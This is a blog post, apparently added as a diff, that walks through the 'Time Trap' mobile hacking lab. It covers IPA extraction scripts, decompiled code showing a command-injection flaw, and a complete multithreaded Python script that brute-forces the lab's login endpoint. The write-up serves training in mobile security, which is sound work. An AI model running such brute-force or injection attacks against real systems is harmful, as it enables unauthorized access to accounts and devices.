@@ -1,0 +1,314 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Time Trap Mobile Hacking Labs // incogbyte ⚔️ 🚩</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="jodson 0.142.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Rodolfo &#39;incogbyte&#39; Tavares" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.3373d1880564393d6fdfebd581c3c0426fb8fec976a9d3ca81aaf15ef48012d3.css" />
+    
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Time Trap Mobile Hacking Labs">
+  <meta name="twitter:description" content="Introduction In this challenge, you will explore the vulnerabilities in an internally used application named Time Trap, focusing on Command Injection. Time Trap is a fictional application that showcases insecure practices commonly found in internal applications. Your objective is to exploit the Command Injection vulnerability to gain unauthorized access and execute commands on the iOS device.
+Initial Setup First, let’s install the .ipa file on our jailbroken device:
+Analysis Process 1. Automated Analysis Setup We’ll use the following bash script to automate the class-dump analysis and .IPA extraction:">
+
+    <meta property="og:url" content="https://incogbyte.github.io/posts/time-trap-mobilehackinglabs/">
+  <meta property="og:site_name" content="incogbyte ⚔️ 🚩">
+  <meta property="og:title" content="Time Trap Mobile Hacking Labs">
+  <meta property="og:description" content="Introduction In this challenge, you will explore the vulnerabilities in an internally used application named Time Trap, focusing on Command Injection. Time Trap is a fictional application that showcases insecure practices commonly found in internal applications. Your objective is to exploit the Command Injection vulnerability to gain unauthorized access and execute commands on the iOS device.
+Initial Setup First, let’s install the .ipa file on our jailbroken device:
+Analysis Process 1. Automated Analysis Setup We’ll use the following bash script to automate the class-dump analysis and .IPA extraction:">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-05-31T14:10:48-03:00">
+    <meta property="article:modified_time" content="2025-05-31T14:10:48-03:00">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://incogbyte.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Rodolfo &#39;incogbyte&#39; Tavares" /></a>
+      <span class="app-header-title">incogbyte ⚔️ 🚩</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/cve/">CVEs</a>
+      </nav>
+      <p>Just another bit inside the matrix. (Infosec/Dev/🕸️⚔)</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/incogbyte" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://x.com/incogbyte" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-x">
+  <title>x</title>
+  <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+          </a>
+        
+          <a href="https://linkedin.com/in/rodolfo-tavares-543863a7" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+          <a href="https://keybase.io/incogbyte/pgp_keys.asc" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-key">
+  <title>keybase</title>
+  <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path>
+</svg>
+          </a>
+        
+          <a href="https://infosec.exchange/@incogbyte" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
+  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Time Trap Mobile Hacking Labs</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          May 31, 2025
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h3 id="introduction">Introduction</h3>
+<p>In this challenge, you will explore the vulnerabilities in an internally used application named Time Trap, focusing on Command Injection. Time Trap is a fictional application that showcases insecure practices commonly found in internal applications. Your objective is to exploit the Command Injection vulnerability to gain unauthorized access and execute commands on the iOS device.</p>
+<h3 id="initial-setup">Initial Setup</h3>
+<p>First, let&rsquo;s install the .ipa file on our jailbroken device:</p>
+<p><img src="/images/time-01.png" alt=""></p>
+<h3 id="analysis-process">Analysis Process</h3>
+<h4 id="1-automated-analysis-setup">1. Automated Analysis Setup</h4>
+<p>We&rsquo;ll use the following bash script to automate the class-dump analysis and .IPA extraction:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check if an IPA file was provided</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;Usage: </span>$0<span style="color:#e6db74"> &lt;path_to_ipa_file&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>  exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>IPA_FILE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check if the IPA file exists</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> ! -f <span style="color:#e6db74">&#34;</span>$IPA_FILE<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;[@] Error: IPA file not found!&#34;</span>
+</span></span><span style="display:flex;"><span>  exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get the app name from the IPA file</span>
+</span></span><span style="display:flex;"><span>APP_NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>basename <span style="color:#e6db74">&#34;</span>$IPA_FILE<span style="color:#e6db74">&#34;</span> .ipa<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>OUTPUT_DIR<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>dirname <span style="color:#e6db74">&#34;</span>$IPA_FILE<span style="color:#e6db74">&#34;</span> | xargs readlink -f<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create output directory</span>
+</span></span><span style="display:flex;"><span>OUTPUT_DIR<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$OUTPUT_DIR<span style="color:#e6db74">/</span>$APP_NAME<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>mkdir -p <span style="color:#e6db74">&#34;</span>$OUTPUT_DIR<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Unzip the IPA contents</span>
+</span></span><span style="display:flex;"><span>UNZIP_DIR<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$OUTPUT_DIR<span style="color:#e6db74">/_extracted&#34;</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[*] Extracting IPA contents...&#34;</span>
+</span></span><span style="display:flex;"><span>mkdir -p <span style="color:#e6db74">&#34;</span>$UNZIP_DIR<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>unzip -q <span style="color:#e6db74">&#34;</span>$IPA_FILE<span style="color:#e6db74">&#34;</span> -d <span style="color:#e6db74">&#34;</span>$UNZIP_DIR<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Locate the .app directory</span>
+</span></span><span style="display:flex;"><span>APP_PATH<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>find <span style="color:#e6db74">&#34;</span>$UNZIP_DIR<span style="color:#e6db74">&#34;</span> -name <span style="color:#e6db74">&#34;*.app&#34;</span> -type d<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span>$APP_PATH<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;[@] No .app found in </span>$UNZIP_DIR<span style="color:#e6db74">, exiting...&#34;</span>
+</span></span><span style="display:flex;"><span>  exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BINARY<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$APP_PATH<span style="color:#e6db74">/</span><span style="color:#66d9ef">$(</span>basename <span style="color:#e6db74">&#34;</span>$APP_PATH<span style="color:#e6db74">&#34;</span> .app<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check if the binary exists</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> ! -f <span style="color:#e6db74">&#34;</span>$BINARY<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;[@] No binary found in </span>$APP_PATH<span style="color:#e6db74">, exiting...&#34;</span>
+</span></span><span style="display:flex;"><span>  exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create directories for class dumps</span>
+</span></span><span style="display:flex;"><span>CLASS_DUMP_OUTPUT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$OUTPUT_DIR<span style="color:#e6db74">/class_dump&#34;</span>
+</span></span><span style="display:flex;"><span>SWIFT_DUMP_OUTPUT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$OUTPUT_DIR<span style="color:#e6db74">/swift_dump&#34;</span>
+</span></span><span style="display:flex;"><span>mkdir -p <span style="color:#e6db74">&#34;</span>$CLASS_DUMP_OUTPUT<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>mkdir -p <span style="color:#e6db74">&#34;</span>$SWIFT_DUMP_OUTPUT<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Dump Objective-C classes using class-dump</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[*] Dumping Objective-C classes for </span>$APP_NAME<span style="color:#e6db74">...&#34;</span>
+</span></span><span style="display:flex;"><span>ipsw class-dump <span style="color:#e6db74">&#34;</span>$BINARY<span style="color:#e6db74">&#34;</span> --headers -o <span style="color:#e6db74">&#34;</span>$CLASS_DUMP_OUTPUT<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Dump Swift classes using swift-dump</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[*] Dumping Swift classes for </span>$APP_NAME<span style="color:#e6db74">...&#34;</span>
+</span></span><span style="display:flex;"><span>ipsw swift-dump <span style="color:#e6db74">&#34;</span>$BINARY<span style="color:#e6db74">&#34;</span> &gt; <span style="color:#e6db74">&#34;</span>$SWIFT_DUMP_OUTPUT<span style="color:#e6db74">/</span>$APP_NAME<span style="color:#e6db74">-mangled.txt&#34;</span>
+</span></span><span style="display:flex;"><span>ipsw swift-dump <span style="color:#e6db74">&#34;</span>$BINARY<span style="color:#e6db74">&#34;</span> --demangle &gt; <span style="color:#e6db74">&#34;</span>$SWIFT_DUMP_OUTPUT<span style="color:#e6db74">/</span>$APP_NAME<span style="color:#e6db74">-demangled.txt&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Decompilation completed for </span>$APP_NAME<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p><img src="/images/time-02.png" alt=""></p>
+<h4 id="2-infoplist-analysis">2. Info.plist Analysis</h4>
+<p>Let&rsquo;s examine the Info.plist file using <code>ipsw</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ipsw plist _extracted/Payload/Time<span style="color:#ae81ff">\ </span>Trap.app/Info.plist
+</span></span></code></pre></div><p>The most interesting part is the deep link configuration:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#34;CFBundleURLTypes&#34;</span>: <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;CFBundleTypeRole&#34;</span>: <span style="color:#e6db74">&#34;Viewer&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;CFBundleURLName&#34;</span>: <span style="color:#e6db74">&#34;com.mobilehackinglab.Gotham-Times&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;CFBundleURLSchemes&#34;</span>: <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;gothamtimes&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">]</span>
+</span></span></code></pre></div><h4 id="3-binary-analysis">3. Binary Analysis</h4>
+<p>Let&rsquo;s examine the class-dump and verify the function signatures:</p>
+<p><img src="/images/time-05.png" alt=""></p>
+<p><img src="/images/time-07.png" alt=""></p>
+<p>As we can see, we have the class name <code>Time_Trap</code> and some UI methods. Let&rsquo;s analyze the Time Trap binary in Ghidra:</p>
+<p><img src="/images/time-10.png" alt=""></p>
+<p>The <code>buttonPressed</code> function is particularly interesting:</p>
+<p><img src="/images/time-08.png" alt=""></p>
+<p>This function contains a command injection vulnerability:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((local_320 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    uVar19 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    local_138 <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)Swift<span style="color:#f92672">::</span>DefaultStringInterpolation<span style="color:#f92672">::</span><span style="color:#a6e22e">init</span>(<span style="color:#ae81ff">0x2d</span>,<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    DVar20.unknown <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>    local_130 <span style="color:#f92672">=</span> uVar19;
+</span></span><span style="display:flex;"><span>    SVar21 <span style="color:#f92672">=</span> Swift<span style="color:#f92672">::</span>String<span style="color:#f92672">::</span><span style="color:#a6e22e">init</span>(<span style="color:#e6db74">&#34;if [[ $(uname -a) != </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">0x16</span>,<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    local_478 <span style="color:#f92672">=</span> SVar21.bridgeObject;
+</span></span><span style="display:flex;"><span>    Swift<span style="color:#f92672">::</span>DefaultStringInterpolation<span style="color:#f92672">::</span><span style="color:#a6e22e">appendLiteral</span>(SVar21,DVar20);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_swift_bridgeObjectRelease</span>(local_478);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploitation-process">Exploitation Process</h3>
+<h4 id="1-authentication-bypass">1. Authentication Bypass</h4>
+<p>Before exploiting the command injection, we need to authenticate. We can use a Python script to brute force valid credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://gist.github.com/giper45/414c7adf883f113142c2dde1106c0c4c for username and password </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> concurrent.futures <span style="color:#f92672">import</span> ThreadPoolExecutor, as_completed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> product
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://mhl.pages.dev/time-trap/login&#34;</span>
+</span></span><span style="display:flex;"><span>HEADERS <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Accept-Encoding&#34;</span>: <span style="color:#e6db74">&#34;gzip, deflate, br&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;*/*&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Accept-Language&#34;</span>: <span style="color:#e6db74">&#34;en-US;q=0.9,en;q=0.8&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/json&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_wordlists</span>(users_path, passwords_path):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(users_path, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> ufile:
+</span></span><span style="display:flex;"><span>        users <span style="color:#f92672">=</span> [line<span style="color:#f92672">.</span>strip() <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> ufile <span style="color:#66d9ef">if</span> line<span style="color:#f92672">.</span>strip()]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(passwords_path, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> pfile:
+</span></span><span style="display:flex;"><span>        passwords <span style="color:#f92672">=</span> [line<span style="color:#f92672">.</span>strip() <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> pfile <span style="color:#66d9ef">if</span> line<span style="color:#f92672">.</span>strip()]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> list(product(users, passwords))  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">try_login</span>(username, password):
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>: username, <span style="color:#e6db74">&#34;password&#34;</span>: password}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(URL, headers<span style="color:#f92672">=</span>HEADERS, json<span style="color:#f92672">=</span>data)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[SUCCESS] Username: </span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74"> | Password: </span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (username, password)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[FAIL] </span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[ERROR] </span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brute_force</span>(users_path, passwords_path):
+</span></span><span style="display:flex;"><span>    credentials <span style="color:#f92672">=</span> load_wordlists(users_path, passwords_path)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> ThreadPoolExecutor(max_workers<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>) <span style="color:#66d9ef">as</span> executor:
+</span></span><span style="display:flex;"><span>        futures <span style="color:#f92672">=</span> [executor<span style="color:#f92672">.</span>submit(try_login, user, pwd) <span style="color:#66d9ef">for</span> user, pwd <span style="color:#f92672">in</span> credentials]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> future <span style="color:#f92672">in</span> as_completed(futures):
+</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">=</span> future<span style="color:#f92672">.</span>result()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> result:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt;&gt;&gt; Valid credentials found: </span><span style="color:#e6db74">{</span>result[<span style="color:#ae81ff">0</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>result[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                exit(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Usage: python brute_force_login.py &lt;users.txt&gt; &lt;passwords.txt&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    brute_force(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>])
+</span></span></code></pre></div><h4 id="2-command-injection-exploitation">2. Command Injection Exploitation</h4>
+<p>After finding valid credentials, we can exploit the command injection vulnerability to execute arbitrary commands and retrieve the flag:</p>
+<p><img src="/images/time-09.png" alt=""></p>
+<h3 id="conclusion">Conclusion</h3>
+<p>This lab demonstrates several important security concepts:</p>
+<ol>
+<li>
+<p><strong>Command Injection Vulnerabilities</strong>:</p>
+<ul>
+<li>How improper input validation can lead to command injection</li>
+<li>The importance of sanitizing user input</li>
+<li>The risks of executing system commands with user input</li>
+</ul>
+</li>
+<li>
+<p><strong>Authentication Security</strong>:</p>
+<ul>
+<li>The importance of strong authentication mechanisms</li>
+<li>How weak credentials can be brute-forced</li>
+<li>The need for proper session management</li>
+</ul>
+</li>
+<li>
+<p><strong>Mobile Application Security</strong>:</p>
+<ul>
+<li>The importance of proper input validation</li>
+<li>The need for secure coding practices</li>
+</ul>
+</li>
+</ol>
+<p>This lab provides valuable insights into mobile application security and the importance of proper input validation and authentication mechanisms. For a hands-on experience with these concepts, visit the MobileHackingLab - Time Trap challenge.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
